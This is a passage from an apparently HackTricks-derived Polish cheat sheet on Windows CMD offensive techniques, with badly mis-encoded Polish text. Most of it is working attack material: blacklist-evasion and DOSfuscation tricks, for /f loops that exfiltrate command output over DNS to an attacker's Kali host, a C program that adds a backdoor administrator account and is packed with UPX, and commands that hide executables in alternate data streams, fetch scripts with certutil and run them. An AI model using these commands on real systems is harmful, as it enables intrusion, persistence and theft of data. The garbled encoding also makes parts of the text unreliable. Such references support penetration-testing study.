4. **UÅ¼ycie kodÃ³w znakÃ³w**: MoÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ kodÃ³w znakÃ³w, ktÃ³re reprezentujÄ… znaki za pomocÄ… ich wartoÅ›ci szesnastkowych. Na przykÅ‚ad, znak `#` moÅ¼e byÄ‡ reprezentowany jako `%23`, a znak `&` jako `%26`. MoÅ¼esz sprÃ³bowaÄ‡ uÅ¼yÄ‡ tych kodÃ³w znakÃ³w, aby obejÅ›Ä‡ czarnÄ… listÄ™.

PamiÄ™taj, Å¼e omijanie czarnej listy znakÃ³w jest technikÄ…, ktÃ³ra moÅ¼e byÄ‡ nielegalna lub naruszaÄ‡ politykÄ™ bezpieczeÅ„stwa. Zawsze stosuj siÄ™ do odpowiednich przepisÃ³w i zasad etycznych podczas testowania penetracyjnego.

```bash
echo %HOMEPATH:~6,-11%   #\
who^ami   #whoami
```

### DOSfuscation

Generuje zasÅ‚oniÄ™tÄ… liniÄ™ poleceÅ„ CMD

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
help
SET COMMAND type C:\Users\Administrator\Desktop\flag.txt
encoding
```

### Kontrola dostÄ™pu do adresÃ³w nasÅ‚uchu

MoÅ¼esz nasÅ‚uchiwaÄ‡ na [http://+:80/Temporary\_Listen\_Addresses/](http://+/Temporary\_Listen\_Addresses/) bez koniecznoÅ›ci posiadania uprawnieÅ„ administratora.

```bash
netsh http show urlacl
```

### Manualne powÅ‚oki DNS

**AtakujÄ…cy** (Kali) musi skorzystaÄ‡ z jednej z tych 2 opcji:

```bash
sudo responder -I <iface> #Active
sudo tcpdump -i <iface> -A proto udp and dst port 53 and dst ip <KALI_IP> #Passive
```

#### Ofiara

Technika **`for /f tokens`**: Pozwala nam wykonywaÄ‡ polecenia, pobieraÄ‡ pierwsze X sÅ‚Ã³w z kaÅ¼dej linii i wysyÅ‚aÄ‡ je za pomocÄ… DNS na nasz serwer.

```bash
for /f %a in ('whoami') do nslookup %a <IP_kali> #Get whoami
for /f "tokens=2" %a in ('echo word1 word2') do nslookup %a <IP_kali> #Get word2
for /f "tokens=1,2,3" %a in ('dir /B C:\') do nslookup %a.%b.%c <IP_kali> #List folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)"') do nslookup %a.%b.%c <IP_kali> #List that folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Progra~2"') do nslookup %a.%b.%c <IP_kali> #Same as last one
#More complex commands
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('whoami /priv ^| findstr /i "enable"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali> #Same as last one
```

MoÅ¼esz rÃ³wnieÅ¼ **przekierowaÄ‡** wynik i nastÄ™pnie go **odczytaÄ‡**.

```
whoami /priv | finstr "Enab" > C:\Users\Public\Documents\out.txt
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('type "C:\Users\Public\Documents\out.txt"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali>
```

## WywoÅ‚ywanie CMD z kodu C

To call CMD from C code, you can use the `system()` function provided by the C standard library. This function allows you to execute a command in the command prompt.

Here is an example of how to use `system()` to call CMD from C code:

```c
#include <stdlib.h>

int main() {
    system("cmd /c <command>");
    return 0;
}
```

Replace `<command>` with the command you want to execute in CMD. The `/c` flag is used to execute the command and then terminate CMD.

After compiling and running the C code, the specified command will be executed in CMD.

```c
#include <stdlib.h>     /* system, NULL, EXIT_FAILURE */

// When executed by Administrator this program will create a user and then add him to the administrators group
// i686-w64-mingw32-gcc addmin.c -o addmin.exe
// upx -9 addmin.exe

int main (){
int i;
i=system("net users otherAcc 0TherAcc! /add");
i=system("net localgroup administrators otherAcc /add");
return 0;
}
```

## Arkusz oszustw z alternatywnymi strumieniami danych (ADS/Alternate Data Stream)

**PrzykÅ‚ady pochodzÄ… z** [**https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f**](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)**. Jest tam ich znacznie wiÄ™cej!**

```bash
## Selected Examples of ADS Operations ##

### Adding Content to ADS ###
# Append executable to a log file as an ADS
type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
# Download a script directly into an ADS
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt

### Discovering ADS Content ###
# List files and their ADS
dir /R
# Use Sysinternals tool to list ADS of a file
streams.exe <c:\path\to\file>

### Extracting Content from ADS ###
# Extract an executable stored in an ADS
expand c:\ads\file.txt:test.exe c:\temp\evil.exe

### Executing ADS Content ###
# Execute an executable stored in an ADS using WMIC
wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'
# Execute a script stored in an ADS using PowerShell
powershell -ep bypass - < c:\temp:ttt
```

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmujÄ…cej siÄ™ cyberbezpieczeÅ„stwem**? Chcesz zobaczyÄ‡, jak Twoja **firma jest reklamowana w HackTricks**? A moÅ¼e chcesz mieÄ‡ dostÄ™p do **najnowszej wersji PEASS lub pobraÄ‡ HackTricks w formacie PDF**? SprawdÅº [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family).
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com).
* **DoÅ‚Ä…cz do** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy Telegram**](https://t.me/peass) lub **Å›ledÅº** mnie na **Twitterze** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
